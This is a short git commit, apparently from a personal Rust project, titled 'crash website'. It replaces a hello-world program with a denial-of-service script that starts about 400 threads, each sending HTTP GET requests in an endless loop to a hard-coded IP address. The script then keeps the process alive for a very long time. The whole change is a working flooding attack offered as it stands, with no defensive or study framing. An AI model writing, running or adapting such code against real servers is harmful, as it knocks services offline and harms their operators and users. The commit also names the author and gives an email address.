f4d4e48ef268fe4a1a6a34f25143749a11dd6d9c
luckycurve <luckycurvec@gmail.com>
2023-11-17 22:47:23 +0800

    crash website

--- src/main.rs
+++ src/main.rs
@@ -1,3 +1,13 @@
-fn main() {
-    println!("hello")
+use std::{thread, time::Duration};
+
+use reqwest::Result;
+
+fn main() -> Result<()> {
+    for _i in 1..400 {
+        thread::spawn(|| loop {
+            reqwest::blocking::get("http://111.230.96.17");
+        });
+    }
+    thread::sleep(Duration::from_secs(10000000));
+    Ok(())
 }
